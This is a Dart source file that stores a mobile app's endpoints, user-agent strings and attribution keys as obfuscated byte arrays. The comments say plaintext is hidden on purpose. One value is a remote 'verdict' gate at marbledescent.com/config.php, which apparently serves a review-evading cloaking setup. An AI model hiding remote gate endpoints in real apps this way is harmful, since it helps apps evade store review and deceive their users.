import 'glyph_codec.dart';

// ============================================================
// GLYPH PACK — encoded endpoints & credentials
// ============================================================
// Every value below is a keystream-encoded byte list produced by
// `dart run tool/glyph_packer.dart`. No plaintext appears in this
// file on purpose.
//
// AppsFlyer key + Firebase project number are intentionally empty
// until the manager delivers them. Empty input → unweave() returns
// "" → the attribution layer skips SDK init and the gate call is
// still made (backend receives whatever install-data / device-side
// fields we have) — nothing crashes.
//
// After changing plaintext values in tool/glyph_packer.dart, re-run
// the tool and REPLACE the six arrays below.
// ============================================================

// verdictEndpoint  <=  "https://marbledescent.com/config.php"
const List<int> _verdictEndpoint = <int>[
  169, 153, 49, 240, 36, 91, 243, 214, 207, 156, 8, 151, 98, 161, 10, 71,
  248, 71, 25, 17, 97, 195, 152, 14, 120, 244, 67, 9, 237, 9, 75, 121,
  157, 52, 183, 191,
];

// gcdOrigin  <=  "https://gcdsdk.appsflyer.com/install_data/v4.0/"
const List<int> _gcdOrigin = <int>[
  169, 153, 49, 240, 36, 91, 243, 214, 197, 158, 30, 134, 106, 175, 64, 67,
  251, 84, 15, 25, 121, 148, 158, 19, 59, 184, 79, 11, 172, 6, 76, 109,
  199, 37, 179, 163, 120, 194, 208, 55, 223, 248, 58, 235, 54, 227, 199,
];

// chromeMajor  <=  "149.0.7220.24"
const List<int> _chromeMajor = <int>[
  240, 217, 124, 174, 103, 79, 235, 203, 144, 205, 84, 199, 58,
];

// webkitTag  <=  "537.36"
const List<int> _webkitTag = <int>[244, 222, 114, 174, 100, 87];

// attributionKey  <=  AppsFlyer Dev Key (encoded)
const List<int> _attributionKey = <int>[
  149, 172, 9, 182, 5, 15, 177, 186, 229, 164, 63, 146, 91, 149, 41, 114,
  198, 86, 40, 8, 64,
];

// messagingProject  <=  Firebase project number (encoded)
const List<int> _messagingProject = <int>[
  244, 221, 113, 183, 111, 85, 238, 205, 148, 205, 77, 197,
];

String unpackVerdictEndpoint() => unweave(_verdictEndpoint);
String unpackGcdOrigin() => unweave(_gcdOrigin);
String unpackChromeMajor() => unweave(_chromeMajor);
String unpackWebkitTag() => unweave(_webkitTag);
String unpackAttributionKey() => unweave(_attributionKey);
String unpackMessagingProject() => unweave(_messagingProject);

/// Assembles the GCD retry URL when the AppsFlyer first callback lied
/// about `af_status == "Organic"`. Returns "" when either the origin
/// or the dev key are still unpacked — callers must treat "" as
/// "GCD retry unavailable, use SDK data as-is".
String composeGcdUrl(String appId, String deviceUid) {
  final String origin = unpackGcdOrigin();
  final String key = unpackAttributionKey();
  if (origin.isEmpty || key.isEmpty) return '';
  return '$origin$appId?devkey=$key&device_id=$deviceUid';
}
